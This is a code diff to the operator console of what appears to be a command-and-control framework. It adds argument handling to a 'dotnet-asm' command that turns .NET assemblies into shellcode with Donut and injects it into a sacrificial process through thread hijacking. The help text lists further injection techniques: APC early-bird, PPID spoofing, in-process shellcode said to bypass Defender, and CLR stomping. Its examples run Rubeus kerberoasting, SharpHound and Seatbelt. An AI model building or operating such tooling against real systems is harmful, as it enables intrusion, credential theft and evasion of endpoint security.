@@ -9283,7 +9283,7 @@ const AC_COMMANDS = [
   ['screenshot','screenshot → server'],
   ['inject','inject <pid> <sc.bin>  — section map + CreateRemoteThread into existing process'],
   ['inject-apc','inject-apc <sc.bin> [proc]  — APC early-bird: spawn suspended proc, inject, resume'],
-  ['dotnet-asm','dotnet-asm <asm.exe> [proc]  — .NET → Donut (shellcode) → APC into new sacrificial process; no visible CLR'],
+  ['dotnet-asm','dotnet-asm <asm.exe> [args...] [/proc:<process>]  — .NET → Donut → fork-run in sacrificial process; no visible CLR'],
   ['dotnet-exec','dotnet-exec <asm.exe> [args]  — .NET inline-execute: native in-process CLR, captures Console.Write (Rubeus, Seatbelt, SharpHound)'],
   ['forkrun','forkrun <sc.bin> [proc]  — PPID spoof + section map + thread hijack in sacrificial proc'],
   ['stage2','stage2 <sc.bin>  — in-process shellcode (CreateThread in current agent, bypasses Defender)'],
@@ -9852,7 +9852,7 @@ ${isWin ? `
 
 <span class="console-section">.NET / BOF</span>
   dotnet-exec &lt;asm.exe&gt; [args]      CLR inline-execute in-process — Rubeus, Seatbelt, SharpHound, etc.
-  dotnet-asm &lt;asm.exe&gt; [proc]       .NET → Donut → APC in sacrificial process (no CLR visible in agent)
+  dotnet-asm &lt;asm.exe&gt; [args] [/proc:&lt;p&gt;]  .NET → Donut → fork-run in sacrificial process
   clrstomp &lt;asm.exe&gt; [args]         .NET without Donut or new process: replace legitimate GAC assembly
   bof &lt;name|file.o&gt; [args]          execute BOF (COFF x64); name=preinstalled, file.o=uploaded
   bof list                           list available BOFs on C2 server
@@ -10157,16 +10157,20 @@ ${isWin ? `  • Useful for finding target PIDs for inject/inject-apc/token stea
   'dotnet-asm': `<b>dotnet-asm</b> — execute .NET assembly via Donut in sacrificial process
 
   <span class="console-section">USAGE</span>
-  dotnet-asm &lt;assembly.exe&gt; [sacrificial_process]
+  dotnet-asm &lt;assembly.exe&gt; [args...] [/proc:&lt;sacrificial_process&gt;]
+
+  args...    arguments baked into the shellcode by Donut (-p flag)
+  /proc:     optional sacrificial process path (default: RuntimeBroker.exe)
 
   <span class="console-section">EXAMPLES</span>
   dotnet-asm SharpHound.exe
-  dotnet-asm Seatbelt.exe svchost.exe
-  dotnet-asm Rubeus.exe notepad.exe
+  dotnet-asm SharpUp.exe audit
+  dotnet-asm Rubeus.exe kerberoast /outfile:tgs.txt
+  dotnet-asm Seatbelt.exe -group=all /proc:dllhost.exe
 
   <span class="console-section">TECHNIQUE</span>
-  1. Server converts the .NET EXE to shellcode with Donut
-  2. Shellcode injected into [proc] sacrificial via APC early-bird
+  1. Server converts the .NET EXE to shellcode with Donut (args baked in via -p)
+  2. Shellcode injected into sacrificial process via RIP hijack (suspended CreateProcess)
   3. .NET runs inside sacrificial process — no CLR visible in agent
 
   <span class="console-section">NOTES</span>
@@ -11728,19 +11732,28 @@ async function dispatchConsoleCmd(agentID, cmdLine) {
       break;
     }
     case 'dotnet-asm': {
-      const eaparts = args.split(' ');
-      if (!eaparts[0]) { addConsoleOutput('usage: dotnet-asm <asm.exe> [proc]', '', null); return; }
+      const eaparts = args.trim().split(/\s+/);
+      if (!eaparts[0]) { addConsoleOutput('usage: dotnet-asm <asm.exe> [args...] [/proc:<process>]', '', null); return; }
+      // Separate /proc:<path> flag from assembly args
+      let daProc = '', daArgParts = [];
+      for (const p of eaparts.slice(1)) {
+        if (p.startsWith('/proc:')) daProc = p.slice(6);
+        else daArgParts.push(p);
+      }
+      const daArgs = daArgParts.join(' ');
       addConsoleOutput(`[*] Fetching ${eaparts[0]} from server…`, '', null);
       try {
         const asmBytes = await fetchSCFile(eaparts[0]);
-        addConsoleOutput('[*] Converting with donut…', '', null);
-        const dr = await fetch(`${BASE}/api/donut`, {method:'POST',headers:{'Authorization':'Bearer '+TOKEN,'Content-Type':'application/octet-stream'},body:asmBytes});
+        const donutMsg = daArgs ? `[*] Converting with donut (args: ${daArgs})…` : '[*] Converting with donut…';
+        addConsoleOutput(donutMsg, '', null);
+        const donutUrl = `${BASE}/api/donut` + (daArgs ? `?args=${encodeURIComponent(daArgs)}` : '');
+        const dr = await fetch(donutUrl, {method:'POST',headers:{'Authorization':'Bearer '+TOKEN,'Content-Type':'application/octet-stream'},body:asmBytes});
         if (!dr.ok) { addConsoleOutput('', `donut failed: ${dr.statusText}`, null); return; }
         const sc = new Uint8Array(await dr.arrayBuffer());
         addConsoleOutput(`[+] shellcode: ${sc.length} bytes`, '', null);
         payload = u8ToB64(sc);
         taskType = 'FORK_RUN';
-        taskArgs = JSON.stringify({cmd: eaparts.slice(1).join(' ')});
+        taskArgs = JSON.stringify({cmd: daProc});
       } catch(e) { addConsoleOutput('', 'dotnet-asm error: '+e.message, null); return; }
       break;
     }
